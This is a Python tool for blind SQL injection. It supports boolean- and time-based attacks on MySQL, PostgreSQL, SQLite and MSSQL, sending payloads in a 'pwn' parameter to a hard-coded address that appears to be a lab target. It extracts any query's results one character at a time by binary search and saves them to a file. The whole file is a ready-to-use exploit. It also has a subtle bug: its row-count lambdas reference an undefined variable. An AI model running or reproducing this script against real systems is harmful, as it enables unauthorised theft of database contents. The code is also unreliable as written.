#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import sys
import time
import urllib3
import requests
import datetime
from enum import Enum


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Database(Enum):
    MySQL = 1
    PostgreSQL = 2
    SQLite = 3
    MSSQL = 4


class SQLiType(Enum):
    Boolean = 1
    Time = 2


######### CHANGE THIS #########
database = Database.MySQL
# database = Database.PostgreSQL
# database = Database.SQLite
# database = Database.MSSQL
sqlitype = SQLiType.Boolean
# sqlitype = SQLiType.Time
PRE = "' or"
POST = '-- -'
sleep_time = 2
###############################


if database == Database.PostgreSQL:
    SELECT_ROW = lambda query,row_num: f'{query} limit 1 offset {row_num}'
    ADD_SLEEP = lambda query: f'({query} AND 1=(select 1 from pg_sleep({sleep_time})))'
    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
    SUBSTRING = 'substring'
    ASCII = 'ascii'
    VERSION = f'select {SUBSTRING}(version(),1,10) as leak'
    DBNAME ='PostgreSQL'
elif database == Database.MySQL:
    SELECT_ROW = lambda query,row_num: f'{query} limit {row_num},1'
    ADD_SLEEP = lambda query: f'if({query},sleep({sleep_time}),0)'
    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
    SUBSTRING = 'mid'
    ASCII = 'ascii'
    VERSION = f'select {SUBSTRING}(version(),1,10) as leak'
    DBNAME = 'MySQL'
elif database == Database.SQLite:
    SELECT_ROW = lambda query,row_num: f'{query} limit {row_num-1},1'
    ADD_SLEEP = lambda query: f'{query} and 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB({sleep_time}00000000/2))))'
    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
    SUBSTRING = 'substr'
    ASCII = 'unicode'
    VERSION = f'select {SUBSTRING}(sqlite_version(),1,10) as leak'
    DBNAME = 'SQLite'
elif database == Database.MSSQL:
    # why so complicated!?
    def mssql_select_row(query, row_num):
        q_data = parse_query(query)
        assert q_data['has_from']
        where_added = f"{q_data['col_name']} not in (select top {row_num} {q_data['col_name']} from {q_data['table']} order by {q_data['col_name']}) order by {q_data['col_name']}"
        if q_data['has_where']:
            where = f"({q_data['where']}) and {where_added}"
        else:
            where = where_added
        return f"select top 1 {q_data['selection']} from {q_data['table']} where {where}"
    SELECT_ROW = mssql_select_row
    # ADD_SLEEP = lambda query: f'IF({query}) WAITFOR DELAY \'0:0:{sleep_time}\''
    LENGTH = lambda query,number: f'UNICODE(SUBSTRING(({query}),{number},1))>1'
    def mssql_num_rows(query, number):
        q_data = parse_query(query)
        query = query.replace(q_data['selection'], 'count(*)')
        return f'({query})>{number}'
    NUM_ROWS = mssql_num_rows
    SUBSTRING = 'substring'
    ASCII = 'unicode'
    VERSION = f'select {SUBSTRING}(@@version,1,20) as leak'
    DBNAME = 'MSSQL'
else:
    exit('invalid database type')
compare_value = None


if database == Database.MSSQL and sqlitype == SQLiType.Time:
    exit('MSSQL only supports Boolean based SQLi, sorry!')

# printable chars:
# 9, 10, 13, 11, 12
# 32-126
start_char = 9
end_char = 126

num_queries = 0


def set_compare_value():
    global compare_value
    query = f'{PRE} (select 1)=1 {POST}'
    measurements = []
    if sqlitype == SQLiType.Time:
        # this can be probably be done better
        for i in range(10):
            start = time.time_ns()
            send_req(query)
            end = time.time_ns()
            measurements.append(end - start)
        max_value = max(measurements)
        compare_value = max_value + (sleep_time * 1000000000)
        compare_value *= 0.85
    else:
        r = send_req(query)
        compare_value = int(r.headers['Content-Length'])


def send_req(payload):
    # CHANGE THIS
    global num_queries
    num_queries += 1
    # print(payload)
    params = {'pwn': payload}
    cookies = {}
    proxies = {}
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    url = 'http://10.10.10.10/index.php'
    r = requests.get(url,
                     params=params,
                     verify=False,
                     proxies=proxies,
                     allow_redirects=False,
                     cookies=cookies)
    return r


def check_if_true(r, time_elapsed):
    if sqlitype == SQLiType.Time:
        return time_elapsed >= compare_value
    else:
        # checking the content length is good enough for most cases
        return int(r.headers['Content-Length']) == compare_value


def query_equals_true(payload):
    if sqlitype == SQLiType.Time:
        payload = ADD_SLEEP(payload)
    payload = f'{PRE} {payload} {POST}'
    start = time.time_ns()
    r = send_req(payload)
    end = time.time_ns()
    time_elapsed = end - start
    return check_if_true(r, time_elapsed)


def parse_query(query):
    parsed = {}
    # get the selection
    match = re.search(r'select (.+?)( from|$)', query, re.IGNORECASE)
    if match is None:
        exit('The query needs to start with SELECT')
    parsed['selection'] = match.group(1).strip()
    # get the name of the column
    match = re.search(r'.*? as (\w+)', parsed['selection'], re.IGNORECASE)
    if match is not None:
        parsed['col_name'] = match.group(1).strip()
    else:
        match = re.search(r'^[a-zA-Z_][a-zA-Z0-9_]*$', parsed['selection'])
        if match is None:
            print('column name not recognized')
            print('make sure you only include one column')
            print('including an \'as aliasname\' on the target column might help')
            exit()
        parsed['col_name'] = parsed['selection']
    # get the table, if any
    match = re.search(r'select .+? from (.+?)(?: where|$)', query, re.IGNORECASE)
    parsed['has_from'] = match is not None
    if parsed['has_from']:
        parsed['table'] = match.group(1).strip()
        # get the where part, if any
        match = re.search(r'select .+? from .+? where (.+)', query, re.IGNORECASE)
        parsed['has_where'] = match is not None
        if parsed['has_where']:
            parsed['where'] = match.group(1).strip()
    return parsed


def get_column_name(query):
    return parse_query(query)['col_name']


def get_length(query, num_row):
    q_data = parse_query(query)
    col_name = q_data['col_name']

    if q_data['has_from']:
        query = SELECT_ROW(query, num_row)

    # check that the query actually returns something
    null_test = f"EXISTS({query})"
    if query_equals_true(null_test) is False:
        print('the query did not return any results')
        return 0

    # check the it doesn't return NULL
    null_test = f"1 = (select count(1) from ({query}) as T where {col_name} IS NOT NULL)"
    if query_equals_true(null_test) is False:
        print('the query returns NULL')
        return 0

    # get the length of the response
    start = 0
    end = 5000  # this could be larger
    while start != end:
        middle = (end + start) // 2
        payload = LENGTH(query, middle)
        if query_equals_true(payload):
            start = middle + 1
        else:
            end = middle
    return start


def get_num_rows(query):
    start = 1
    end = 5000  # this could be larger
    while start != end:
        middle = (end + start) // 2
        payload = NUM_ROWS(query, middle)
        if query_equals_true(payload):
            start = middle + 1
        else:
            end = middle
    return start


def leak_query(query):
    set_compare_value()
    print(f'query: {query}')
    q_data = parse_query(query)
    leaks = []
    has_table = q_data['has_from']
    if has_table:
        num_rows = get_num_rows(query)
    else:
        num_rows = 1
    print(f'num rows: {num_rows}\n')
    if num_rows == 0:
        return leaks
    try:
        for num_row in range(1, num_rows + 1):
            leak = ''
            length = get_length(query, num_row)
            for i in range(1, length + 1):
                start = start_char
                end = end_char
                while start != end:
                    middle = (end + start) // 2
                    if has_table:
                        q = SELECT_ROW(query, num_row)
                    else:
                        q = query
                    payload = f"{ASCII}({SUBSTRING}(({q}), {i}, 1)) > {middle}"
                    if query_equals_true(payload):
                        start = middle + 1
                    else:
                        end = middle
                leak += chr(start)
                print(f'leaking row {num_row}: {leak}', end='\r')

            print(f'leaked row {num_row}: {leak}  ')
            if length > 0:
                leaks.append(leak)
    except KeyboardInterrupt:
        print('')
    return leaks


def main():
    print('\033[1m\033[94m Blind SQL injection script \033[0m\033[0m\n')
    t = 'Boolean' if sqlitype == SQLiType.Boolean else 'Time'
    print(f'exploiting: {DBNAME}, {t} based')

    start = time.time()

    query = input('enter query: ')
    sys.stdout.buffer.write(b"\033[F\033[K")
    if query == '':
        query = VERSION
        print('using demo query\n')

    # exploit!
    leak = leak_query(query)

    if len(leak) > 0:
        with open('output.txt', 'a') as f:
            f.write(f'{query}\n')
            for i, entry in enumerate(leak):
                f.write(f'row {i+1}: {entry}\n')
            f.write('\n')
        print('[+] saved all rows in output.txt')
    else:
        print('[!] no output!')

    end = time.time()
    run_time = str(datetime.timedelta(seconds=round(end-start)))

    print(f'[i] completed after {num_queries} queries in {run_time}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('')

